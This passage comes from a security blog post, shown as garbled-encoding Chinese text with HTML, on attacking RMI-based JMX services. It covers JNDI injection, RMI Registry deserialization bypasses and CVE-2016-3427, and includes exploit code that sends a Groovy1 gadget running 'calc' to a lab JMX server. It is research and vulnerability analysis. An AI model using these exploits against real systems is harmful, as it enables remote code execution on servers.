Extensionï¼Œå³Javaç®¡ç†æ‰©å±•ï¼Œæ˜¯ç®¡ç†&#x2F;ç›‘æ§åº”ç”¨ç¨‹åºã€è®¾å¤‡ã€ç³»ç»Ÿå¯¹è±¡çš„å·¥å…·ã€‚è¿™äº›è¢«ç®¡ç†çš„å¯¹è±¡éƒ½å¯ä»¥æŠ½è±¡ä¸ºMBeanè¿›è¡Œè¡¨ç¤ºï¼Œå®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡ç«¯æ¥ç®¡ç†MBeanï¼Œå¦‚æŸ¥è¯¢MBeanå±æ€§ã€è°ƒç”¨MBeanæ–¹æ³•ç­‰æ“ä½œã€‚è€ŒMBeançš„ä»£ç å®šä¹‰æ˜¯æœ‰è¦æ±‚çš„ï¼Œéœ€è¦å®ç°ä¸€ä¸ªæ¥å£ï¼Œæ‰€æœ‰éœ€è¦å¯¹å¤–å…¬å¼€çš„æ–¹æ³•éƒ½éœ€è¦åœ¨è¯¥æ¥å£ä¸­å£°æ˜ã€‚å¦å¤–æ­¤æ¥å£è¦æ±‚åœ¨MBeanç±»åååŠ ä¸ŠMBeanåç¼€ï¼Œè¿™é‡Œä¾‹å­ä¸­çš„MBeanç±»æ˜¯Helloï¼Œæ¥å£ä¸ºHelloMBean</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">//Hello.java</span><br>package org.<span class="hljs-property">example</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HelloMBean</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> newName</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = newName;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello: &quot;</span> + name;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>HelloMBeanæ¥å£ï¼š</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//HelloMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">HelloMBean</span> </span>&#123;<br>    <span class="hljs-comment">// getter and setter for the attribute &quot;name&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> getName();<br>    <span class="hljs-keyword">public</span> void setName(<span class="hljs-keyword">String</span> <span class="hljs-keyword">new</span><span class="hljs-type">Name</span>);<br>    <span class="hljs-comment">// Bean method &quot;sayHello&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> sayHello();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¯¹äºç®¡ç†å™¨è€Œè¨€ï¼Œè¿™äº›MBeanä¸­å…¬å¼€çš„æ–¹æ³•ï¼Œæœ€ç»ˆä¼šè¢«JMXè½¬åŒ–ä¸ºå±æ€§ï¼ˆ Attribute ï¼‰ã€è°ƒç”¨ï¼ˆ Invoke ï¼‰ã€ç›‘å¬ï¼ˆ Listener ï¼‰ç­‰æ¦‚å¿µã€‚é»˜è®¤æƒ…å†µä¸‹æ¯ä¸ªJavaè¿›ç¨‹éƒ½è¿è¡Œç€MBeanç®¡ç†æœåŠ¡ï¼Œä½¿ç”¨<code>ManagementFactory.getPlatformMBeanServer()</code>è·å–åˆ°MBeanServeråå¯å¯¹MBeanè¿›è¡Œæ“ä½œã€‚ä¸‹é¢çš„ä¾‹å­æ¨¡æ‹Ÿç®¡ç†å™¨æ³¨å†ŒMBeanå¹¶æ˜¾ç¤ºå½“å‰javaè¿›ç¨‹ä¸­çš„æ‰€æœ‰MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/1.png"></p><p>å¦‚æœæƒ³è®©æˆ‘ä»¬çš„MBeanåœ¨ç®¡ç†å™¨ä¸Šå¯è°ƒç”¨ï¼Œé‚£ä¹ˆéœ€è¦æŒ‡å®šä¸€ä¸ª<code>ObjectName</code>å¯¹è±¡ï¼Œå…³äºå¯¹è±¡åç§°çš„è¯¦ç»†è¯­æ³•å¯å‚è€ƒï¼š<a href="https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html%E3%80%82">https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.htmlã€‚</a></p><p> Object Name åœ¨æ³¨å†ŒMBeanæ—¶ç”¨äºæŒ‡å®šåç§°ï¼Œåœ¨æŸ¥è¯¢çš„æ—¶å€™å¯ä»¥æŒ‡å®šæ­£åˆ™ç”¨äºæŸ¥è¯¢ï¼Œå»åŒ¹é…åç§°ç¬¦åˆæ­£åˆ™æ¡ä»¶çš„MBeanã€‚æ¯ä¸ªObject Nameéƒ½éœ€è¦åŒ…å«ä¸€ä¸ªtypeå…³é”®å±æ€§</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//MBeanExample.java<br>package org.example;<br><br><span class="hljs-keyword">import</span> javax.management.MBeanServer;<br><span class="hljs-keyword">import</span> javax.management.ObjectInstance;<br><span class="hljs-keyword">import</span> javax.management.ObjectName;<br><span class="hljs-keyword">import</span> java.lang.management.ManagementFactory;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> MBeanExample &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>        // <span class="hljs-keyword">Create</span> a <span class="hljs-built_in">new</span> MBean instance <span class="hljs-keyword">from</span> Hello (HelloMBean interface)<br>        Hello mbean = <span class="hljs-built_in">new</span> Hello();<br>        // <span class="hljs-keyword">Create</span> an <span class="hljs-keyword">object</span> <span class="hljs-type">name</span>,<br>        ObjectName mbeanName = <span class="hljs-built_in">new</span> ObjectName(&quot;org.example.Hello:type=HelloMBean&quot;);<br>        // <span class="hljs-keyword">Connect</span> <span class="hljs-keyword">to</span> the MBean <span class="hljs-keyword">server</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">current</span> Java process<br>        MBeanServer <span class="hljs-keyword">server</span> = ManagementFactory.getPlatformMBeanServer();<br>        <span class="hljs-keyword">server</span>.registerMBean(mbean, mbeanName);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span> : <span class="hljs-keyword">server</span>.queryMBeans(<span class="hljs-built_in">new</span> ObjectName(&quot;*:*&quot;), <span class="hljs-keyword">null</span>))<br>        &#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println( ((ObjectInstance)<span class="hljs-keyword">object</span>).getObjectName() );<br>        &#125;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Press any key to exit&quot;);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨jconsoleè¿æ¥æœ¬åœ°çš„org.example.MBeanExampleç±»èµ·çš„9052è¿›ç¨‹åï¼Œå¯ä»¥è®¾ç½®MBeançš„å±æ€§&#x2F;è°ƒç”¨æ–¹æ³•ï¼Œå¦‚æˆ‘ä»¬è¿™é‡Œçš„sayHello()æ–¹æ³•</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/2.png"></p><p>è°ƒç”¨sayHello()æ–¹æ³•</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/3.png"></p><p>ä¹Ÿå¯ä»¥å¼€å¯è¿œç¨‹æœåŠ¡ï¼Œå°†Helloã€HelloMBeanã€MBeanExampleæ‰“åŒ…ä¸ºjmxserver.jaråŒ…åï¼Œç”¨å¦‚ä¸‹å‘½ä»¤å¼€å¯è°ƒè¯•åŠŸèƒ½ã€JMXç›‘å¬ç«¯å£å¹¶è®¾ç½®éè®¤è¯ã€‚è¿™é‡Œä¸ºæ¼”ç¤ºå‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œå°†groovy-2.3.9.jaræ·»åŠ åˆ°classpathä¸­ï¼Œæ–¹ä¾¿æˆ‘ä»¬åç»­åˆ©ç”¨Groovy Gadget</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span>  -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/4.png"></p><p>ä½¿ç”¨nmapæ‰«æå…¶ç«¯å£å¯ä»¥çœ‹åˆ°ï¼Œ2222ç«¯å£MBeanç®¡ç†æœåŠ¡å®é™…ä¸Šæ˜¯åŸºäºRMI Registryçš„ï¼Œå¯¹è±¡åç§°ä¸ºjmxrmiï¼Œstubç«¯å£ä¸º56139</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/5.png"></p><h2 id="2ã€æ”»å‡»JMX"><a href="#2ã€æ”»å‡»JMX" class="headerlink" title="2ã€æ”»å‡»JMX"></a>2ã€æ”»å‡»JMX</h2><p>æˆ‘ä»¬æŒ‰ç…§æ•´ä½“è°ƒç”¨æµç¨‹ã€è¿‡ç¨‹ä¸­å­˜åœ¨çš„åˆ©ç”¨ç‚¹ã€å®˜æ–¹å¯¹æ¼æ´çš„ä¿®å¤æªæ–½åŠåç»­åˆ©ç”¨è¿›è¡Œåˆ†æï¼Œä¹Ÿä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œä¸ªäººå°†æ”»å‡»JMXæœåŠ¡åˆ†ä¸º5ç§åˆ©ç”¨æ–¹å¼ï¼š</p><p>1ã€jmx-urlè¿æ¥åœ°å€å¯æ§çš„JNDIæ³¨å…¥åˆ©ç”¨æ–¹å¼</p><p>2ã€æ”»å‡»RMI Registryçš„åˆ©ç”¨æ–¹å¼</p><p>3ã€RMIå±‚â€è‡ªå®šä¹‰â€æ–¹æ³•newClientåˆ©ç”¨æ–¹å¼</p><p>4ã€JMXå±‚MBeanæ–¹æ³•getLoggerLevel&#x2F;gcClassHistogramåˆ©ç”¨æ–¹å¼</p><p>5ã€MLETåŠ¨æ€åŠ è½½Evil MBeançš„åˆ©ç”¨æ–¹å¼</p><p>ç¬¬ä¸€ç§æ˜¯é’ˆå¯¹JMXå®¢æˆ·ç«¯çš„åˆ©ç”¨æ–¹å¼ï¼Œä¹Ÿæå¸¦çœ‹ä¸€ä¸‹ã€‚åé¢å‡ ç§éƒ½æ˜¯é’ˆå¯¹JMXæœåŠ¡ï¼Œå…¶ä¸­234éƒ½éœ€è¦ç›®æ ‡ClassPathå­˜åœ¨å¯ç”¨çš„Gadgeté“¾ï¼Œè€Œç¬¬5ä¸ªMLETåŠ¨æ€åŠ è½½æ˜¯è½½å…¥æ‰§è¡Œæ”»å‡»è€…åˆ›å»ºçš„æ¶æ„MBeanç±»æ–¹æ³•ï¼Œæ‰€ä»¥æ²¡æœ‰Gadgetçš„é™åˆ¶ã€‚ä»æ•´ä½“çœ‹ï¼ŒJMXå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯äº¤äº’çš„æµç¨‹åŠåˆ©ç”¨ç‚¹å¦‚ä¸‹:</p><p>1ã€å®¢æˆ·ç«¯ä½¿ç”¨javax.naming.InitialContext#lookupè·å–åˆ°åç§°ä¸ºâ€jmxrmiâ€çš„ Stubä»£ç†å¯¹è±¡ï¼Œ<strong>å½“JMX urlå¯æ§æ—¶ï¼Œä¼šé€ æˆJNDIæ³¨å…¥çš„é—®é¢˜</strong>ã€‚è¿™æ˜¯ç¬¬ä¸€ä¸ªåˆ©ç”¨ç‚¹</p><p>2ã€å®¢æˆ·ç«¯è°ƒç”¨javax.management.remote.rmi.RMIServer#newClientå»è·å–RMIConnectionImpl Stubä»£ç†å¯¹è±¡ã€‚å½“JMXæœåŠ¡éœ€è¦éªŒè¯æ—¶ï¼Œä¼šä½¿ç”¨JAAS-based authenticatorè¿›è¡Œæƒé™æ ¡éªŒï¼šæ ¹æ®æœåŠ¡çš„å¯åŠ¨å‚æ•°åŠjmxremote.passwordã€jmxremote.accessé…ç½®æ–‡ä»¶å»åŒ¹é…ï¼Œå½“æ ¡éªŒé€šè¿‡åè¿”å›ä»£ç†å¯¹è±¡ã€‚<br>è¿™éƒ¨åˆ†ä¼šæ¶‰åŠä¸¤ä¸ªåˆ©ç”¨ç‚¹ï¼š<br>aã€JMXåº•å±‚æ˜¯ä¾æ®RMIè¿›è¡Œé€šä¿¡ï¼Œå½“JDKç‰ˆæœ¬åœ¨ä½ç‰ˆæœ¬æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ”»å‡»RMI Registryçš„expè¿›è¡Œæ”»å‡»ï¼Œ<strong>å¯åˆ©ç”¨bind&#x2F;lookupæ–¹æ³•ä¼ è¾“æ¶æ„åºåˆ—æ•°æ®&#x2F;UnicastRefé“¾åˆ©ç”¨</strong>ã€‚è¿™æ˜¯ç¬¬äºŒä¸ªåˆ©ç”¨ç‚¹<br>bã€newClientæ–¹æ³•ç¬¦åˆæˆ‘ä»¬åœ¨æ”»å‡»RMIä¸­æåˆ°çš„<strong>åº”ç”¨å±‚ååºåˆ—åŒ–é—®é¢˜</strong>æƒ…å†µï¼Œå‚æ•°ä¸ºObjectç±»å‹ï¼Œå¯ä»¥å¡å…¥æˆ‘ä»¬çš„æ¶æ„Padyloadæ•°æ®ã€‚è¿™æ˜¯ç¬¬ä¸‰ä¸ªåˆ©ç”¨ç‚¹</p><p>3ã€å®¢æˆ·ç«¯invokeè°ƒç”¨RMIConnectionImpl Stubä»£ç†å¯¹è±¡çš„æ–¹æ³•å»æ“ä½œMBean&#x2F;è·å–MBeanä¿¡æ¯<br>è¿™éƒ¨åˆ†ä¼šæ¶‰åŠä¸¤ä¸ªæ”»å‡»ç‚¹ï¼š<br>aã€JMXå±‚åœ¨<strong>è¿˜åŸMBeanæ–¹æ³•å‚æ•°æ—¶ä¹Ÿæ˜¯é‡‡ç”¨ååºåˆ—åŒ–æ–¹å¼</strong>è¿›è¡Œè¿˜åŸçš„ï¼Œæ‰€ä»¥å¯å°†æ¶æ„æ•°æ®å¡å…¥é»˜è®¤MBeançš„æœ‰å‚æ–¹æ³•ã€‚è¿™æ˜¯ç¬¬å››ä¸ªåˆ©ç”¨ç‚¹<br>bã€åœ¨å®¢æˆ·ç«¯è¿æ¥æˆåŠŸåˆ›å»ºMBeanæ—¶ï¼Œ<strong>å¯è°ƒç”¨MLETåŠ¨æ€åŠ è½½çš„æ–¹å¼å»åŠ è½½æ”»å‡»è€…æ„å»ºçš„Evil MBeanå®Œæˆåˆ©ç”¨</strong>ã€‚è¿™æ˜¯ç¬¬äº”ä¸ªåˆ©ç”¨ç‚¹</p><p>ä¸‹é¢æ˜¯è¯¦ç»†åˆ†æåŠå¯†ç éªŒè¯åçš„ç»•è¿‡æ–¹å¼</p><h3 id="2-1-jmx-urlè¿æ¥åœ°å€å¯æ§çš„JNDIæ³¨å…¥åˆ©ç”¨æ–¹å¼"><a href="#2-1-jmx-urlè¿æ¥åœ°å€å¯æ§çš„JNDIæ³¨å…¥åˆ©ç”¨æ–¹å¼" class="headerlink" title="2.1 jmx-urlè¿æ¥åœ°å€å¯æ§çš„JNDIæ³¨å…¥åˆ©ç”¨æ–¹å¼"></a>2.1 jmx-urlè¿æ¥åœ°å€å¯æ§çš„JNDIæ³¨å…¥åˆ©ç”¨æ–¹å¼</h3><p>ä½¿ç”¨Javaä»£ç JMXConnectorFactory#connectè¿æ¥JMXæœåŠ¡ç«¯æ—¶ï¼Œä¼šè°ƒç”¨åˆ°InitialContext#lookupå»è·å–åç§°ä¸ºâ€jmxrmiâ€çš„è¿œç«¯å¯¹è±¡ã€‚å½“JMX urlå¯æ§æ—¶ï¼Œä¼šé€ æˆJNDIæ³¨å…¥çš„é—®é¢˜ï¼Œè°ƒç”¨æ ˆåŠæ¼”ç¤ºå¦‚ä¸‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">JMX JNDI Gadget:<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.JMXConnectorFactory</span><span class="hljs-selector-class">.connect</span>(JMXConnectorFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">270</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.connect</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">287</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServer</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1922</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServerJNDI</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1955</span>)<br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.InitialContext</span><span class="hljs-selector-class">.lookup</span>(InitialContext<span class="hljs-selector-class">.java</span>:<span class="hljs-number">417</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/6.png"></p><p>èµ·ä¸ªæ¶æ„LDAPæœåŠ¡ï¼ŒjavaReferenceAddressæ”¾ç½®æˆ‘ä»¬çš„Groovy1é“¾çš„Padyloadï¼Œå¯ä»¥çœ‹åˆ°JMXå®¢æˆ·ç«¯åœ¨JDKé«˜ç‰ˆæœ¬çš„æƒ…å†µä¸‹æˆåŠŸè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ç»•è¿‡åŸç†è§å…ˆå‰æ–‡ç« ï¼š<a href="https://pwnull.github.io/2022/jndi-injection-history/">å½“æˆ‘ä»¬è°ˆè®ºJNDIæ³¨å…¥æ—¶ï¼Œæˆ‘ä»¬åœ¨è°ˆè®ºä»€ä¹ˆ</a></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/7.png"></p><p>JMX JNDIæ³¨å…¥è°ƒç”¨æ ˆï¼š</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/8.png"></p><h3 id="2-2-æ”»å‡»RMI-Registryçš„åˆ©ç”¨æ–¹å¼"><a href="#2-2-æ”»å‡»RMI-Registryçš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="2.2 æ”»å‡»RMI Registryçš„åˆ©ç”¨æ–¹å¼"></a>2.2 æ”»å‡»RMI Registryçš„åˆ©ç”¨æ–¹å¼</h3><p>å› ä¸ºJMXåº•å±‚ä¹Ÿæ˜¯ä¾æ®RMIè¿›è¡Œé€šä¿¡ï¼Œæ‰€ä»¥å½“JDKç‰ˆæœ¬åœ¨ä½ç‰ˆæœ¬æ—¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ”»å‡»RMI Registryçš„expè¿›è¡Œæ”»å‡»ã€‚ä¸”è¿™ç§æ”»å‡»æ–¹å¼çš„è§¦å‘ç‚¹æ˜¯åœ¨RMIå±‚ï¼Œè¿˜æœªæ‰§è¡Œåˆ°JMXæƒé™æ ¡éªŒéƒ¨åˆ†ï¼Œæ‰€ä»¥ä¸å—JMXæƒé™çš„é™åˆ¶</p><p>JEP290å‰çš„JDK8u112ç‰ˆæœ¬ï¼Œä½¿ç”¨é»˜è®¤ysoserialä¸­çš„ysoserial.exploit.RMIRegistryExploitæµ‹è¯•æˆåŠŸ</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/9.png"></p><p>JEP290åçš„JDK131ç‰ˆæœ¬ä½¿ç”¨ UnicastRef é“¾ç»•è¿‡æˆåŠŸã€141å¯ä½¿ç”¨æ”¹é€ åçš„lookup()+UnicastRef é“¾è¿›è¡Œç»•è¿‡</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/10.png"></p><p>æµ‹è¯•JDK191ç‰ˆæœ¬ä¸‹ï¼Œåœ¨sun.management.jmxremote.SingleEntryRegistry#singleRegistryFilterè§¦å‘æ£€æŸ¥ï¼Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚</p><p>JMXæœåŠ¡ç«¯è°ƒè¯•æƒ…å†µï¼Œåœ¨singleRegistryFilterè§¦å‘ç™½åå•æ£€æŸ¥æŠ¥é”™</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/11.png"></p><p>æ”»å‡»ç«¯ï¼š</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/12.png"></p><h3 id="2-3-RMIå±‚â€è‡ªå®šä¹‰â€æ–¹æ³•newClientåˆ©ç”¨æ–¹å¼-CVE-2016-3427"><a href="#2-3-RMIå±‚â€è‡ªå®šä¹‰â€æ–¹æ³•newClientåˆ©ç”¨æ–¹å¼-CVE-2016-3427" class="headerlink" title="2.3 RMIå±‚â€è‡ªå®šä¹‰â€æ–¹æ³•newClientåˆ©ç”¨æ–¹å¼-CVE-2016-3427"></a>2.3 RMIå±‚â€è‡ªå®šä¹‰â€æ–¹æ³•newClientåˆ©ç”¨æ–¹å¼-CVE-2016-3427</h3><p>å½“å®¢æˆ·ç«¯ä½¿ç”¨<code>JMXConnectorFactory.connect</code>å»è¿æ¥æœåŠ¡ç«¯æ—¶ï¼Œæœ€ç»ˆè°ƒç”¨åˆ°<code>javax.management.remote.rmi.RMIServerImpl_Stub#newClient</code>å‘èµ·è¿æ¥ã€‚å…¶å®è¯¥æ–¹æ³•ç¬¦åˆæˆ‘ä»¬åœ¨æ”»å‡»RMI Registryä¸­æåˆ°çš„â€œåº”ç”¨å±‚ååºåˆ—åŒ–é—®é¢˜â€æƒ…å†µï¼šnewClientæ–¹æ³•å‚æ•°ä¸ºObjectç±»å‹ï¼Œå¯ä»¥å¡å…¥æˆ‘ä»¬çš„æ¶æ„Padyloadï¼ˆåˆ©ç”¨JMXConnector.CREDENTIALSé…ç½®æ·»åŠ ï¼‰ï¼Œexpå¦‚ä¸‹</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>    <span class="hljs-keyword">Object</span> obj = <span class="hljs-built_in">new</span> Groovy1().getObject(&quot;calc&quot;);<br>    connectWithJmxUrlByObject(obj);<br>&#125;<br><br>private static <span class="hljs-type">void</span> connectWithJmxUrlByObject(<span class="hljs-keyword">Object</span> credentials) throws MalformedURLException, IOException &#123;<br>    String url = &quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;;<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Trying to connect to &quot; + url + &quot; ...&quot;);<br>    Map&lt;String, <span class="hljs-keyword">Object</span>&gt; props = <span class="hljs-built_in">new</span> HashMap&lt;&gt;();<br>    props.put(JMXConnector.CREDENTIALS, credentials);<br>    JMXConnector connector = JMXConnectorFactory.<span class="hljs-keyword">connect</span>(<span class="hljs-built_in">new</span> JMXServiceURL(url), props);<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Connected: &quot; + connector.getConnectionId());<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println();<br>    connector.<span class="hljs-keyword">close</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸåœ¨JDK8u77-JMXæœåŠ¡ä¸Šæ‰§è¡ŒæˆåŠŸï¼š</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/13.png"></p><p>è¯¥æ¼æ´åœ¨JDK8u91æ—¶è¢«ä¿®å¤ï¼Œæ–°å¢äº†javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapperç±»ç»§æ‰¿è‡ªDeserializationCheckeræ¥å£ï¼Œè¯¥ç±»å®ç°äº†checkã€checkProxyClassæ–¹æ³•æ£€æŸ¥å‚æ•°ç±»å‹ï¼Œé™åˆ¶åªèƒ½ä¸º[Ljava.lang.String;ã€java.lang.Stringç±»å‹ã€‚</p><p>åœ¨è¯¥ç‰ˆæœ¬çš„ç¯å¢ƒä¸‹ï¼ŒRMIå±‚ä½¿ç”¨sun.rmi.server.UnicastServerRef#unmarshalParametersæ–¹æ³•è¿˜åŸâ€è‡ªå®šä¹‰æ–¹æ³•â€å‚æ•°æ—¶ï¼Œç”±äºjmxæœåŠ¡æ³¨å†ŒTargetçš„weakImpl#referentä¸ºExportedWrapperï¼Œæ‰€ä»¥åœ¨è¿˜åŸæ“ä½œæ—¶ä¼šè°ƒç”¨åˆ°ExportedWrapper#checkæ£€æŸ¥åºåˆ—åŒ–æ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œå¾ˆæ˜¾ç„¶Groovy1å¤–éƒ¨åŒ…è£…ç±»AnnotationInvocationHandlerä¸åœ¨ç™½åå•ä¸­ï¼Œååºåˆ—åŒ–æ“ä½œæŠ¥é”™</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/14.png"></p><p>javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapperå®ç°DeserializationCheckeræ¥å£</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/15.png"></p><p>JMXæœåŠ¡ç«¯è°ƒç”¨sun.rmi.server.UnicastServerRef#unmarshalParametersè¿˜åŸnewClientçš„å‚æ•°ï¼šç”±äºå®ç°äº†DeserializationCheckeræ¥å£ï¼Œæ‰€ä»¥ä¼šèµ°checkedæµç¨‹ã€‚æ™®é€šRMIæœåŠ¡çš„è‡ªå®šä¹‰æ–¹æ³•ä¼šèµ°uncheckedæµç¨‹</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/16.png"></p><p>æœåŠ¡ç«¯æ‰§è¡Œååºåˆ—åŒ–æ“ä½œè¿˜åŸå‚æ•°æ£€æŸ¥ç™½åå•ï¼šjavax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#check</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/17.png"></p><p>æ­¤æ¼æ´è¢«åˆ†é…ç¼–å·<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427">CVE-2016-3427</a>ï¼Œåœ¨JDK8u91æ—¶è¢«<a 